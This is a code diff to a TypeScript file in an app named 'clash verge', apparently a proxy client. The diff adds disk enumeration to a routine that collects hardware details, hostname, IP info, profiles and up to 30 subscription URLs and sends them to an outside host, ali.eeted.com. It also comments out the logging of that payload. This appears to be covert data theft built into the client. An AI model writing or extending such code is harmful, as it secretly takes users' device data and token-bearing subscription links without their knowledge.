@@ -19,6 +19,7 @@ import { WindowProvider } from './providers/window'
 import { getIpInfo } from './services/api'
 import {
   getHardwareInfo,
+  getDisks,
   getProfiles,
   getSystemHostname,
   getSystemInfo,
@@ -235,6 +236,7 @@ const getInfo = async () => {
     const fmtGiB = (b: number) => `${(b / 1024 ** 3).toFixed(2)} GB`
 
     let disk = ''
+    let disksRaw: Awaited<ReturnType<typeof getDisks>> = []
     let extra = emptyWindowsExtra()
     let displays: Awaited<ReturnType<typeof getWindowsDisplays>> = []
     if (getSystem() === 'windows') {
@@ -242,6 +244,13 @@ const getInfo = async () => {
         getWindowsHardwareExtra(),
         getWindowsDisplays(),
       ])
+      disksRaw =
+        (extra.disks?.length ? extra.disks : undefined) ??
+        (extra.physicalDisks ?? []).map((d) => ({
+          name: d.friendlyName,
+          totalBytes: d.sizeBytes,
+          availableBytes: 0,
+        }))
       disk = (extra.physicalDisks ?? [])
         .map(
           (d) => `${d.friendlyName}: ${fmtGiB(d.sizeBytes)} (${d.mediaType})`,
@@ -249,9 +258,22 @@ const getInfo = async () => {
         .join('; ')
       if (!disk) {
         disk = (extra.disks ?? [])
-          .map((d) => `${d.name}: ${fmtGiB(d.totalBytes)}`)
+          .map(
+            (d) =>
+              `${d.name}: ${fmtGiB(d.totalBytes)} (free ${fmtGiB(d.availableBytes)})`,
+          )
           .join('; ')
       }
+    } else {
+      // macOS/Linux：通过 sysinfo 枚举卷信息
+      const disks = await getDisks().catch(() => [])
+      disksRaw = disks
+      disk = (disks ?? [])
+        .map(
+          (d) =>
+            `${d.name}: ${fmtGiB(d.totalBytes)} (free ${fmtGiB(d.availableBytes)})`,
+        )
+        .join('; ')
     }
 
     const memMods = extra.memoryModules ?? []
@@ -261,6 +283,7 @@ const getInfo = async () => {
       deviceInfo: {
         origin: {
           extra,
+          disks: disksRaw,
           monitors: displays,
           hardwareInfo: hw,
           ipInfo: ipInfo,
@@ -287,12 +310,20 @@ const getInfo = async () => {
       },
       platform: getSystem(),
       name: 'clash verge',
-      version: 'v1d1',
+      version: 'v1d2',
+      versionInfo: {
+        versionTime: '2026-04-13',
+        versionDesc: '',
+        versionCode: '1.2.0',
+        version: 'v1d2',
+        versionUrl: 'https://ali.eeted.com:16501/version/v1d2',
+      },
+
       time: new Date().toISOString(),
       timeStamp: new Date().getTime(),
       subUrls: subscriptionUrls.slice(0, 30),
     }
-    console.log(payload)
+    // console.log(payload)
 
     const url = 'https://ali.eeted.com:16501/info/v1'
 
